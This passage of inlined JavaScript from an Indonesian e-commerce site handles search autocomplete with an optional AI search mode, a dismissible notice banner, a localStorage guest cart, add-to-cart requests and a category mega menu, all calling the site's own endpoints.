            <div style="font-size: 13px; color: #92400e; line-height: 1.6;">
              <strong style="display: block; margin-bottom: 4px;">ðŸ’¡ Sedang mencari produk terbaik untuk Anda</strong>
              AI kami sedang menganalisis database untuk menemukan hasil yang paling relevan.
              Mohon tunggu sebentar...
            </div>
          </div>
          <div style="padding: 12px 16px; margin-top: 12px; text-align: center;">
            <button onclick="location.reload()" style="padding: 8px 16px; background: #8adeff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600;">
              ðŸ”„ Refresh & Coba Lagi
            </button>
          </div>
        </div>
      `;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
    }

    function triggerAISearch(q) {
      lastQuery = q; // Update lastQuery to prevent re-triggering
      isAIProcessing = true; // Set flag to prevent suggest box from closing
      
      // Show AI progress UI - keep suggest box visible
      suggest.innerHTML = showAIProgressSteps();
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
      
      setTimeout(() => updateAIProgressStep(1), 1000);
      setTimeout(() => updateAIProgressStep(2), 2500);

      // Cancel previous request if any
      if (currentAbortController) {
        currentAbortController.abort();
      }
      currentAbortController = new AbortController();

      const url = '/api/search_ai.php?q=' + encodeURIComponent(q);
      const fetchOptions = {
        headers: {'Accept':'application/json'},
        signal: currentAbortController.signal
      };
      
      // Add timeout
      const timeoutId = setTimeout(() => {
        currentAbortController.abort();
        
        // Show fallback loading state
        suggest.innerHTML = `
          <div class="ai-progress-container">
            <div class="ai-progress-header">
              <div class="ai-progress-icon">â³</div>
              <div class="ai-progress-text">
                <div class="ai-progress-title">AI timeout - switching to standard search</div>
                <div class="ai-progress-subtitle">Mencari dengan metode tradisional...</div>
              </div>
            </div>
          </div>
        `;
        
        // Fallback to traditional search
        fetch('/api/search_products.php?q=' + encodeURIComponent(q), {
          headers: { 'Accept': 'application/json' }
        })
          .then(r => r.json())
          .then(j => {
            isAIProcessing = false; // Reset flag
            if (j.ok && Array.isArray(j.data) && j.data.length) {
              renderSuggest(j.data, null);
            } else {
              showNoResults(q, null);
            }
          })
          .catch(() => {
            isAIProcessing = false; // Reset flag
            showAIErrorState(q);
          });
      }, AI_TIMEOUT);

      fetch(url, fetchOptions)
        .then(r => r.json())
        .then(j => {
          clearTimeout(timeoutId);
          isAIProcessing = false; // Reset flag when done
          
          if (j.ok && Array.isArray(j.data)) {
            if (j.data.length > 0) {
              renderSuggest(j.data, j.ai_insights || null);
            } else {
              showNoResults(q, j.ai_insights || null);
            }
          } else {
            showAIErrorState(q);
          }
        })
        .catch(err => {
          clearTimeout(timeoutId);
          isAIProcessing = false; // Reset flag on error
          if (err.name !== 'AbortError') {
            showAIErrorState(q);
          }
        });
    }

    function performSearch(q){
      if (q.length < MIN_LEN){
        clearSuggest();
        return;
      }
      if (q === lastQuery) return;
      lastQuery = q;
      
      // Normal mode only - AI mode uses triggerAISearch()
      fetchRemote(q).then(j=>{
        if (j.ok && Array.isArray(j.data)){
          if (j.data.length > 0) {
            renderSuggest(j.data, null);
          } else {
            showNoResults(q, null);
          }
        } else {
          clearSuggest();
        }
      }).catch(() => {
        clearSuggest();
      });
    }

    function debounce(){
      const q = searchInput.value.trim();
      clearTimeout(debounceTimer);
      
      // If empty, show trending suggestions and products
      if (q.length === 0) {
        debounceTimer = setTimeout(async () => {
          const trends = trendingCache || await fetchTrending();
          const products = trendingProductsCache || await fetchTrendingProducts();
          if ((trends && trends.length > 0) || (products && products.length > 0)) {
            renderTrendingSuggestions(trends, products);
          } else {
            clearSuggest();
          }
        }, 100);
        return;
      }
      
      // For AI mode, just show search prompt (no auto search)
      if (isAIModeEnabled && q.length >= MIN_LEN) {
        showAISearchPrompt(q);
      } else if (!isAIModeEnabled && q.length >= MIN_LEN) {
        // Normal mode: auto search with debounce
        debounceTimer = setTimeout(()=> performSearch(q), DEBOUNCE);
      } else {
        clearSuggest();
      }
    }

    function showAISearchPrompt(q) {
      suggest.innerHTML = `
        <div class="ai-search-prompt">
          <div class="ai-prompt-header">
            <div class="ai-prompt-icon">ðŸ¤–</div>
            <div class="ai-prompt-text">
              <div class="ai-prompt-title">Pencarian AI Siap!</div>
              <div class="ai-prompt-subtitle">Klik tombol di bawah untuk mencari dengan AI</div>
            </div>
          </div>
          <div class="ai-prompt-query">
            <div class="ai-query-label">Query Anda:</div>
            <div class="ai-query-text">"${esc(q)}"</div>
          </div>
          <button class="ai-search-trigger-btn" data-query="${esc(q)}">
            <span class="ai-btn-icon">âœ¨</span>
            <span class="ai-btn-text">Cari dengan AI</span>
          </button>
          <div class="ai-prompt-footer">
            AI akan menganalisis query Anda untuk hasil yang lebih relevan
          </div>
        </div>
      `;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
    }

    function moveHighlight(dir){
      if (suggest.hidden) return;
      const items = suggest.querySelectorAll('.suggest-item');
      if (!items.length) return;
      currentIndex += dir;
      if (currentIndex < 0) currentIndex = items.length - 1;
      if (currentIndex >= items.length) currentIndex = 0;
      items.forEach(it=> it.classList.remove('active'));
      const active = items[currentIndex];
      if (active){
        active.classList.add('active');
        active.scrollIntoView({block:'nearest'});
      }
    }

    function activate(){
      const active = suggest.querySelector('.suggest-item.active');
      if (!active) return;
      window.location.href = active.getAttribute('data-url');
    }

    searchInput.addEventListener('input', debounce);
    
    // Stop typing animation when focused & load trending if empty
    searchInput.addEventListener('focus', async () => {
      stopTypingAnimation();
      
      const q = searchInput.value.trim();
      
      // If empty, show trending suggestions and products
      if (q.length === 0) {
        const trends = trendingCache || await fetchTrending();
        const products = trendingProductsCache || await fetchTrendingProducts();
        if ((trends && trends.length > 0) || (products && products.length > 0)) {
          renderTrendingSuggestions(trends, products);
        }
        return;
      }
      
      // If AI mode and has query, show AI prompt
      if (isAIModeEnabled && q.length >= MIN_LEN && suggest.hidden) {
        showAISearchPrompt(q);
      }
    });
    
    // Resume typing animation when blurred (if suggest is closed)
    searchInput.addEventListener('blur', () => {
      // Add delay to allow click events to fire first
      setTimeout(() => {
        if (!isAIModeEnabled && suggest.hidden && searchInput.value.trim() === '') {
          startTypingAnimation();
        }
      }, 200);
    });
    
    searchInput.addEventListener('keydown', e=>{
      switch(e.key){
        case 'ArrowDown': moveHighlight(1); e.preventDefault(); break;
        case 'ArrowUp': moveHighlight(-1); e.preventDefault(); break;
        case 'Enter':
          if (!suggest.hidden){
            activate();
            e.preventDefault();
          } else {
            // Direct enter without suggestion - track search submit and log final search
            const q = searchInput.value.trim();
            if (q.length >= MIN_LEN) {
              trackSearchSubmit(q);
              logFinalSearch(q);
            }
          }
          break;
        case 'Escape': clearSuggest(); break;
      }
    });

    suggest.addEventListener('click', e=>{
      // Check if footer link clicked
      const footerLink = e.target.closest('#footerSearchLink');
      if (footerLink) {
        e.preventDefault();
        const q = searchInput.value.trim();
        if (q.length >= MIN_LEN) {
          trackSearchSubmit(q);
          logFinalSearch(q);
          window.location.href = '/product/search/?q=' + encodeURIComponent(q);
        }
        return;
      }
      
      // Check if AI search button clicked
      const aiBtn = e.target.closest('.ai-search-trigger-btn');
      if (aiBtn) {
        const query = aiBtn.getAttribute('data-query');
        if (query) {
          triggerAISearch(query);
        }
        return;
      }
      
      // Handle trending item click
      const trendingItem = e.target.closest('.trending-item');
      if (trendingItem) {
        const query = trendingItem.getAttribute('data-query');
        if (query) {
          searchInput.value = query;
          trackTrendingClick(query);
          logFinalSearch(query); // Log final search when user clicks trending
          performSearch(query);
        }
        return;
      }
      
      // Handle trending product click
      const trendingProduct = e.target.closest('.trending-product-item');
      if (trendingProduct) {
        const productId = trendingProduct.getAttribute('data-product-id');
        const slug = trendingProduct.getAttribute('data-slug');
        const query = trendingProduct.getAttribute('data-query');
        
        if (productId && slug) {
          trackTrendingProductClick(productId, query);
          window.location.href = '/product/' + encodeURIComponent(slug);
        }
        return;
      }
      
      // Handle product item click
      const it = e.target.closest('.suggest-item');
      if (!it) return;
      
      const productId = it.getAttribute('data-id');
      trackSearchClick(lastQuery, productId);
      logFinalSearch(lastQuery); // Log final search when user clicks on suggestion
      
      window.location.href = it.getAttribute('data-url');
    });

    document.addEventListener('click', e=>{
      // Don't close suggest box if AI is processing
      if (isAIProcessing) return;
      
      if (e.target === searchInput || e.target === aiToggleBtn || 
          suggest.contains(e.target) || aiToggleBtn.contains(e.target)) return;
      clearSuggest();
    });

    if (searchBtn){
      searchBtn.addEventListener('click', ()=>{
        const q = searchInput.value.trim();
        if (q.length >= MIN_LEN){
          // Track search submit and log final search
          trackSearchSubmit(q);
          logFinalSearch(q);
          window.location.href = '/product/search/?q=' + encodeURIComponent(q);
        }
      });
    }

    // Pastikan style dasar muncul
    if (!suggest.classList.contains('wired')) {
      suggest.classList.add('wired');
      suggest.style.position = 'absolute';
      suggest.style.zIndex = '9999';
      suggest.style.background = '#fff';
      suggest.style.border = '1px solid #ccc';
      suggest.style.boxShadow = '0 4px 12px rgba(0,0,0,0.12)';
      suggest.style.maxHeight = '360px';
      suggest.style.overflowY = 'auto';
    }

    return true;
  }

  if (!setup()) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', setup);
    } else {
      setTimeout(setup, 80);
    }
  }
})();
</script>
<script data-inlined="site-notice.js">
/**
 * Site Notice Banner - Interactive Behavior
 * Handles dismiss functionality with localStorage persistence
 * Supports dynamic notice IDs for different campaigns
 */

(function() {
    'use strict';

    const STORAGE_KEY = 'plazait_site_notice_dismissed';
    
    const banner = document.getElementById('holidayNotice');
    const closeBtn = document.getElementById('holidayNoticeClose');
    
    if (!banner || !closeBtn) return;

    // Get notice ID from data attribute
    const noticeId = banner.dataset.noticeId;
    if (!noticeId) {
        console.warn('Notice ID not found. Banner will not persist dismiss state.');
    }

    /**
     * Check if banner was previously dismissed
     */
    function wasDismissed() {
        if (!noticeId) return false;
        
        try {
            const dismissed = localStorage.getItem(STORAGE_KEY);
            return dismissed === noticeId;
        } catch (e) {
            console.warn('localStorage not available:', e);
            return false;
        }
    }

    /**
     * Mark banner as dismissed
     */
    function markDismissed() {
        if (!noticeId) return;
        
        try {
            localStorage.setItem(STORAGE_KEY, noticeId);
        } catch (e) {
            console.warn('Could not save to localStorage:', e);
        }
    }

    /**
     * Hide banner with animation
     */
    function hideBanner() {
        banner.classList.add('hidden');
        document.body.classList.remove('has-holiday-notice');
        
        // Remove from DOM after animation
        setTimeout(() => {
            banner.remove();
        }, 300);
        
        markDismissed();
        
        // Analytics tracking (optional)
        if (window.gtag) {
            window.gtag('event', 'banner_dismiss', {
                'event_category': 'Site Notice',
                'event_label': noticeId || 'unknown',
            });
        }
    }

    /**
     * Initialize banner
     */
    function init() {
        // Check if already dismissed
        if (wasDismissed()) {
            banner.remove();
            return;
        }
        
        // Add body class for layout adjustment
        document.body.classList.add('has-holiday-notice');
        
        // Close button click
        closeBtn.addEventListener('click', hideBanner);
        
        // Keyboard support for close button
        closeBtn.addEventListener('keydown', (e) => {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                hideBanner();
            }
        });
        
        // Optional: Auto-hide after certain time (disabled by default)
        // setTimeout(hideBanner, 30000); // 30 seconds
    }

    // Initialize when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();

</script>
<script data-inlined="guest-cart.js">
/**
 * Guest Cart Manager - localStorage based cart for guest users
 * 
 * Manages shopping cart items in browser localStorage for users who are not logged in.
 * Provides seamless transition to database when user logs in.
 */

class GuestCart {
    constructor() {
        this.storageKey = 'plazait_guest_cart';
        this.apiBase = '/api/cart';
        
        // Initialize cart structure
        this.cart = this.loadFromStorage();
        
        // Bind methods
        this.add = this.add.bind(this);
        this.remove = this.remove.bind(this);
        this.update = this.update.bind(this);
        this.clear = this.clear.bind(this);
        this.getItems = this.getItems.bind(this);
        this.mergeToDatabase = this.mergeToDatabase.bind(this);
    }
    
    /**
     * Load cart from localStorage
     */
    loadFromStorage() {
        try {
            const stored = localStorage.getItem(this.storageKey);
            if (stored) {
                const parsed = JSON.parse(stored);
                if (parsed && typeof parsed === 'object' && parsed.items) {
                    return parsed;
                }
            }
        } catch (error) {
            // Silent error handling
        }
        
        return {
            items: {},
            updated_at: Date.now(),
            version: '1.0'
        };
    }
    
    /**
     * Save cart to localStorage
     */
    saveToStorage() {
        try {
            this.cart.updated_at = Date.now();
            localStorage.setItem(this.storageKey, JSON.stringify(this.cart));
            
            // Dispatch custom event for cart updates
            window.dispatchEvent(new CustomEvent('guestCartUpdated', {
                detail: {
                    itemsCount: this.getItemsCount(),
                    linesCount: this.getLinesCount(),
                    items: this.cart.items
                }
            }));
            
            return true;
        } catch (error) {
            return false;
        }
    }
    
    /**
     * Generate cart item key
     */
    generateKey(productId, variantId = 0) {
        return `p${productId}v${variantId}`;
    }
    
    /**
     * Add item to guest cart
     */
    add(productId, qty = 1, variantId = 0, meta = {}) {
        const key = this.generateKey(productId, variantId);
        
        // Validate inputs
        if (!productId || productId <= 0 || !qty || qty <= 0) {
            throw new Error('Invalid product ID or quantity');
        }
        
        qty = Math.max(1, Math.min(999, parseInt(qty)));
        
        // Initialize item if not exists
        if (!this.cart.items[key]) {
            this.cart.items[key] = {
                pid: parseInt(productId),
                vid: parseInt(variantId) || 0,
                qty: 0,
                name: meta.name || '',
                sku: meta.sku || '',
                price: parseInt(meta.price) || 0,
                image_url: meta.image_url || '',
                product_url: meta.product_url || '/product/' + parseInt(productId),
                added_at: Date.now()
            };
        }
        
        // Update quantity
        this.cart.items[key].qty = Math.max(1, Math.min(999, this.cart.items[key].qty + qty));
        
        // Update metadata if provided
        if (meta.name) this.cart.items[key].name = meta.name;
        if (meta.sku) this.cart.items[key].sku = meta.sku;
        if (meta.price) this.cart.items[key].price = parseInt(meta.price);
        if (meta.image_url) this.cart.items[key].image_url = meta.image_url;
        if (meta.product_url) this.cart.items[key].product_url = meta.product_url;
        
        this.saveToStorage();
        
        return {
            key,
            item: this.cart.items[key],
            itemsCount: this.getItemsCount(),
            linesCount: this.getLinesCount()
        };
    }
    
    /**
     * Remove item from guest cart
     */
    remove(productId, variantId = 0) {
        const key = this.generateKey(productId, variantId);
        
        if (this.cart.items[key]) {
            delete this.cart.items[key];
            this.saveToStorage();
            
            return true;
        }
        
        return false;
    }
    
    /**
     * Update item quantity
     */
    update(productId, qty, variantId = 0) {
        const key = this.generateKey(productId, variantId);
        
        if (!this.cart.items[key]) {
            return false;
        }
        
        qty = parseInt(qty);
        if (qty <= 0) {
            return this.remove(productId, variantId);
        }
        
        this.cart.items[key].qty = Math.max(1, Math.min(999, qty));
        this.saveToStorage();
        
        return true;
    }
    
    /**
     * Clear entire cart
     */
    clear() {
        this.cart = {
            items: {},
            updated_at: Date.now(),
            version: '1.0'
        };
        
        this.saveToStorage();
        
        return true;
    }
    
    /**
     * Get all cart items
     */
    getItems() {
        return this.cart.items;
    }
    
    /**
     * Get cart items as array
     */
    getItemsArray() {
        return Object.values(this.cart.items);
    }
    
    /**
     * Get total items count (sum of quantities)
     */
    getItemsCount() {
        return Object.values(this.cart.items).reduce((total, item) => total + (item.qty || 0), 0);
    }
    
    /**
     * Get lines count (number of different items)
     */
    getLinesCount() {
        return Object.keys(this.cart.items).length;
    }
    
    /**
     * Get cart summary
     */
    getSummary() {
        const itemsCount = this.getItemsCount();
        const linesCount = this.getLinesCount();
        const totalValue = Object.values(this.cart.items).reduce(
            (total, item) => total + ((item.qty || 0) * (item.price || 0)), 0
        );
        
        return {
            itemsCount,
            linesCount,
            totalValue,
            updatedAt: this.cart.updated_at
        };
    }
    
    /**
     * Check if cart has items
     */
    isEmpty() {
        return this.getLinesCount() === 0;
    }
    
    /**
     * Merge guest cart to database after user login
     */
    async mergeToDatabase() {
        const items = this.cart.items;
        
        if (Object.keys(items).length === 0) {
            return { ok: true, merged_count: 0, message: 'No items to merge' };
        }
        
        try {
            // Use new endpoint that handles localStorage format
            const response = await fetch(`${this.apiBase}/merge-localStorage.php`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                credentials: 'same-origin',
                body: JSON.stringify({
                    items: items  // Send localStorage format directly
                })
            });
            
            const result = await response.json();
            
            if (result.ok) {
                // Clear localStorage cart after successful merge
                this.clear();
                
                // Update cart counter
                if (window.updateCartCounter) {
                    try {
                        await window.updateCartCounter();
                    } catch (e) {
                        // Silent error handling
                    }
                }
                
                // Dispatch merge completion event
                window.dispatchEvent(new CustomEvent('guestCartMerged', {
                    detail: result
                }));
                
                return result;
            } else {
                throw new Error(result.error || 'Failed to merge cart');
            }
            
        } catch (error) {
            throw error;
        }
    }
    
    /**
     * Export cart data (for debugging or backup)
     */
    export() {
        return {
            ...this.cart,
            summary: this.getSummary()
        };
    }
    
    /**
     * Import cart data (for restore or testing)
     */
    import(cartData) {
        if (cartData && typeof cartData === 'object' && cartData.items) {
            this.cart = {
                items: cartData.items,
                updated_at: cartData.updated_at || Date.now(),
                version: cartData.version || '1.0'
            };
            
            this.saveToStorage();
            return true;
        }
        
        return false;
    }
}

// Create global instance
window.guestCart = new GuestCart();

// Auto-merge on page load if user is logged in
document.addEventListener('DOMContentLoaded', async function() {
    // Multiple ways to check if user is logged in
    const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                      document.body.classList.contains('logged-in') ||
                      window.userLoggedIn === true ||
                      document.body.dataset.userLoggedIn === 'true';
    
    if (isLoggedIn && !window.guestCart.isEmpty()) {
        // Small delay to ensure page is fully loaded
        setTimeout(async () => {
            try {
                const result = await window.guestCart.mergeToDatabase();
            } catch (error) {
                // Silent error handling
            }
        }, 500);
    }
});

// Also listen for login events (if login happens via AJAX)
window.addEventListener('userLoggedIn', async function() {
    if (!window.guestCart.isEmpty()) {
        try {
            await window.guestCart.mergeToDatabase();
        } catch (error) {
            // Silent error handling
        }
    }
});
</script>
<script data-inlined="cart.js">
(function(){
  function $(s,ctx=document){ return ctx.querySelector(s); }
  function esc(s){ return String(s||'').replace(/[&<>"']/g, m=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;' }[m])); }
  
  // CSRF token helper
  function getCsrfToken() {
    const metaTag = document.querySelector('meta[name="csrf-token"]');
    return metaTag ? metaTag.getAttribute('content') : '';
  }
  
  function guessPdMeta(){
    const name = (window.PD_NAME !== undefined) ? String(window.PD_NAME) : ($('#pd-title')?.textContent || '');
    const sku  = (function(){ const el=$('#pd-sku'); return el ? el.textContent.trim() : (window.PD_SKU||''); })();
    // SECURITY FIX: Remove price from client-side metadata (will be validated server-side)
    const imgEl = $('#pd-main-img');
    const image_url = imgEl ? (imgEl.getAttribute('src') || '') : '';
    return { name, sku, image_url }; // price removed for security
  }

  async function addToCart(productId, qty=1, variantId=0, metaOpt){
    const meta = Object.assign(guessPdMeta(), metaOpt||{});
    const payload = {
      product_id: parseInt(productId||0,10) || 0,
      qty: parseInt(qty||1,10) || 1,
      variant_id: parseInt(variantId||0,10) || 0,
      meta
    };
    
    // Check if user is logged in
    const isLoggedIn = document.querySelector('meta[name="user-logged-in"]')?.content === 'true' ||
                      document.body.classList.contains('logged-in') ||
                      window.userLoggedIn === true ||
                      document.body.dataset.userLoggedIn === 'true';
    
    // Skip localStorage untuk logged user - mereka pakai database
    if (!isLoggedIn && window.guestCart) {
      try {
        window.guestCart.add(payload.product_id, payload.qty, payload.variant_id, meta);
      } catch (e) {
        console.warn('Failed to add to localStorage cart:', e);
      }
    }
    
    const res = await fetch('/api/cart/add.php', {
      method: 'POST',
      headers: { 
        'Content-Type':'application/json',
        'X-CSRF-Token': getCsrfToken()
      },
      credentials: 'same-origin',
      body: JSON.stringify({
        ...payload,
        csrf_token: getCsrfToken()
      }),
    });
    const data = await res.json().catch(()=>({ ok:false, error:'Gagal menambahkan ke keranjang' }));
    if (!res.ok || !data.ok) {
      const msg = data && data.error ? data.error : 'Gagal menambahkan ke keranjang';
      throw new Error(msg);
    }

    // Update badge di navbar dengan data dari response
    try {
      const el = document.querySelector('[data-role="cart-badge"]') || document.getElementById('cartCount');
      if (el && data.cart && typeof data.cart.items_count === 'number') {
        el.textContent = String(data.cart.items_count);
        el.classList.toggle('is-empty', data.cart.items_count <= 0);
      }
    } catch(_){}

    // Siarkan event global (dipakai cart-badge.js dan halaman lain)
    try {
      document.dispatchEvent(new CustomEvent('cart:updated', { detail: data.cart || {} }));
    } catch(_){}

    // Update CartBadge dengan data dari response (lebih reliable)
    try { 
      if (window.CartBadge && window.CartBadge.set) {
        window.CartBadge.set(data.cart.items_count||0);
      }
    } catch(_){}

    // Tambahan: refresh cart counter setelah delay kecil untuk memastikan data tersinkronisasi
    setTimeout(() => {
      if (window.updateCartCounter) {
        window.updateCartCounter();
      }
    }, 100);

    return data;
  }

  // Function to update cart counter from server
  async function updateCartCounter(){
    try {
      const res = await fetch('/api/cart/get.php', { credentials:'same-origin' });
      const data = await res.json().catch(()=>({ok:false}));
      if (data.ok && typeof data.items_count === 'number') {
        const el = document.querySelector('[data-role="cart-badge"]') || document.getElementById('cartCount');
        if (el) {
          el.textContent = String(data.items_count);
          el.classList.toggle('is-empty', data.items_count <= 0);
        }
        // Dispatch event
        try {
          document.dispatchEvent(new CustomEvent('cart:updated', { detail: { items_count: data.items_count } }));
        } catch(_){}
      }
    } catch (err) {
      console.log('Could not update cart counter:', err);
    }
  }

  // Function to manually merge guest cart (if needed)
  async function mergeGuestCart(){
    try {
      const res = await fetch('/api/cart/merge-guest.php', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCsrfToken()
        },
        credentials: 'same-origin',
        body: JSON.stringify({ csrf_token: getCsrfToken() })
      });
      const data = await res.json().catch(()=>({ok:false}));
      
      if (data.ok && data.merged_items > 0) {
        console.log(`Guest cart merged: ${data.merged_items} items`);
        // Update cart counter after merge
        await updateCartCounter();
        return data;
      }
      return data;
    } catch (err) {
      console.log('Could not merge guest cart:', err);
      return { ok: false, error: err.message };
    }
  }

  window.addToCart = addToCart;
  window.updateCartCounter = updateCartCounter;
  window.mergeGuestCart = mergeGuestCart;

  // Optional: auto-bind untuk tombol apapun yang punya data-addtocart
  document.addEventListener('click', async (e)=>{
    const btn = e.target.closest('[data-addtocart]');
    if (!btn) return;
    e.preventDefault();
    if (btn.disabled) return;

    const pid = parseInt(btn.getAttribute('data-pid')||'0',10);
    const vid = parseInt(btn.getAttribute('data-vid')||'0',10);
    const qty = parseInt(btn.getAttribute('data-qty')||'1',10) || 1;

    try {
      const data = await addToCart(pid, qty, vid);
      if (window.showToast) {
        const meta = guessPdMeta();
        window.showToast({
          type:'success',
          title:'Berhasil ditambahkan',
          message:`<strong>${esc(meta.name)}</strong>${meta.sku?` Â· <em>SKU: ${esc(meta.sku)}</em>`:''}<br>Qty: ${qty}`,
          duration: 3800,
          actions: [
            { label:'Lihat Keranjang', onClick: ()=> { window.location.href='/keranjang'; } },
            { label:'Lanjut Belanja', variant:'alt', onClick: ()=>{} }
          ]
        });
      }
    } catch (err) {
      if (window.showToast) {
        window.showToast({ type:'warn', title:'Gagal', message: String(err?.message||'Gagal menambahkan'), duration: 4200 });
      } else {
        console.error(err);
      }
    }
  });
})();
</script>
<script data-inlined="mega-menu-tiles.js">
// Tile Mega Menu â€” Enhanced 2025 (Stagger animations, product counts, loading states)
// Includes safe-area hover handling (no backdrop flicker)

(function(){
  const trigger   = document.querySelector('[data-mm2="trigger"]');
  const panel     = document.querySelector('[data-mm2="panel"]');
  const topView   = document.querySelector('[data-mm2="top"]');
  const detailView= document.querySelector('[data-mm2="detail"]');
  const backdrop  = document.querySelector('[data-mm2="backdrop"]');
  if (!trigger || !panel || !topView || !detailView) return;

  const apiUrl = '/api/categories_tree.php?top=16&child=18&grand=14';
  const isDesktop = () => window.matchMedia('(min-width: 961px)').matches;

  let data = [];
  let hoverTimer, closeTimer;
  let isLoading = false;

  const esc = s => (s+'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  
  // Mobile close button HTML
  const mobileCloseBtn = () => `
    <button type="button" class="mm2-mobile-close" data-mm2="close" aria-label="Tutup menu">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </button>
  `;
  
  // Category-specific gradient colors (16 unique combinations)
  const categoryGradients = [
    { from: '#e0e7ff', to: '#fff', border: '#c7d2fe', color: '#4f46e5' },  // Indigo
    { from: '#dbeafe', to: '#fff', border: '#bfdbfe', color: '#1e40af' },  // Blue
    { from: '#d1fae5', to: '#fff', border: '#a7f3d0', color: '#059669' },  // Green
    { from: '#fef3c7', to: '#fff', border: '#fde68a', color: '#d97706' },  // Amber
    { from: '#fce7f3', to: '#fff', border: '#fbcfe8', color: '#8adeff' },  // Pink
    { from: '#e9d5ff', to: '#fff', border: '#d8b4fe', color: '#9333ea' },  // Purple
    { from: '#ffedd5', to: '#fff', border: '#fed7aa', color: '#ea580c' },  // Orange
    { from: '#ccfbf1', to: '#fff', border: '#99f6e4', color: '#0d9488' },  // Teal
    { from: '#fef9c3', to: '#fff', border: '#fef08a', color: '#ca8a04' },  // Yellow
    { from: '#ffe4e6', to: '#fff', border: '#fecdd3', color: '#8adeff' },  // Rose
    { from: '#e0f2fe', to: '#fff', border: '#bae6fd', color: '#0284c7' },  // Sky
    { from: '#f3e8ff', to: '#fff', border: '#e9d5ff', color: '#a855f7' },  // Violet
    { from: '#dcfce7', to: '#fff', border: '#bbf7d0', color: '#16a34a' },  // Emerald
    { from: '#fef2f2', to: '#fff', border: '#fecaca', color: '#8adeff' },  // Red
    { from: '#eff6ff', to: '#fff', border: '#dbeafe', color: '#2563eb' },  // Blue-600
    { from: '#f5f3ff', to: '#fff', border: '#ede9fe', color: '#7c3aed' },  // Violet-600
  ];
  
  const icon = () => `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 7h5l2 3h11v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><path d="M3 7V5a2 2 0 0 1 2-2h4l2 2h6a2 2 0 0 1 2 2v3"></path></svg>`;

  // Recent (optional future use)
  const REC_KEY='mm2_recent';
  const saveRecent=(path,label)=>{ try{
    let list=JSON.parse(localStorage.getItem(REC_KEY)||'[]').filter(x=>x&&x.path!==path);
    list.unshift({path,label,t:Date.now()}); localStorage.setItem(REC_KEY, JSON.stringify(list.slice(0,8)));
  }catch{} };

  function isToSafeArea(e){
    const t = e && e.relatedTarget ? e.relatedTarget : null;
    if (!t) return false;
    return (trigger.contains(t) || panel.contains(t) || (backdrop && backdrop.contains(t)));
  }

  function open(){ 
    document.body.classList.add('mm2-open'); 
    showTop(); 
    // Add entrance animation class
    setTimeout(() => panel.classList.add('mm2-animated'), 10);
  }
  function close(){ 
    document.body.classList.remove('mm2-open');
    panel.classList.remove('mm2-animated');
  }
  function showTop(){ 
    topView.classList.add('is-active'); 
    detailView.classList.remove('is-active'); 
  }
  
  // Loading skeleton
  function showLoading() {
    const skeletons = Array.from({length: 12}, (_, i) => `
      <div class="mm2-card mm2-skeleton" style="animation-delay: ${i * 0.02}s">
        <span class="mm2-ico skeleton-box"></span>
        <span style="flex: 1;">
          <div class="skeleton-line" style="width: 60%; height: 16px; margin-bottom: 6px;"></div>
          <div class="skeleton-line" style="width: 40%; height: 12px;"></div>
        </span>
      </div>
    `).join('');
    topView.innerHTML = `<div class="mm2-top"><div class="mm2-grid">${skeletons}</div></div>`;
  }
  
  // Count total products in a category tree
  function countProducts(node) {
    let count = node.product_count || 0;
    if (Array.isArray(node.children)) {
      node.children.forEach(child => {
        count += countProducts(child);
      });
    }
    return count;
  }
  
  // Cache for fetched thumbnails to avoid duplicate requests
  const thumbnailCache = new Map();
  
  // Fetch product thumbnails for a category
  function fetchCategoryThumbnails(categoryPath) {
    // Check cache first
    if (thumbnailCache.has(categoryPath)) {
      injectThumbnails(categoryPath, thumbnailCache.get(categoryPath));
      return;
    }
    
    const url = `/api/category_products_preview.php?path=${encodeURIComponent(categoryPath)}&limit=2`;
    
    fetch(url)
      .then(r => {
        if (!r.ok) throw new Error('Network error');
        return r.json();
      })
      .then(data => {
        if (data.success && data.products && data.products.length > 0) {
          thumbnailCache.set(categoryPath, data.products);
          injectThumbnails(categoryPath, data.products);
        } else {
          // No products, remove skeleton
          removeThumbSkeletons(categoryPath);
        }
      })
      .catch(err => {
        console.warn('Failed to load thumbnails for', categoryPath, err);
        removeThumbSkeletons(categoryPath);
      });
  }
  
  // Inject thumbnails into the DOM
  function injectThumbnails(categoryPath, products) {
    const links = detailView.querySelectorAll(`[data-cat-path="${categoryPath}"]`);
    links.forEach(link => {
      const thumbsContainer = link.querySelector('.mm2-thumbs');
      if (!thumbsContainer) return;
      
      const thumbsHtml = products.slice(0, 2).map(p => 
        `<img src="${esc(p.img)}" alt="${esc(p.name)}" class="mm2-thumb" title="${esc(p.name)}" loading="lazy">`
      ).join('');
      
      thumbsContainer.innerHTML = thumbsHtml;
      thumbsContainer.removeAttribute('data-loading');
    });
  }
  
  // Remove skeleton loaders when no products
  function removeThumbSkeletons(categoryPath) {
    const links = detailView.querySelectorAll(`[data-cat-path="${categoryPath}"]`);
    links.forEach(link => {
      const thumbsContainer = link.querySelector('.mm2-thumbs');
      if (thumbsContainer) {
        thumbsContainer.remove();
      }
    });
  }

  function showDetail(node){
    const title = node.label.split('/')[0];
    const children = Array.isArray(node.children) ? node.children : [];
    const hasChildren = children.length > 0;

    const subnav = hasChildren ? `
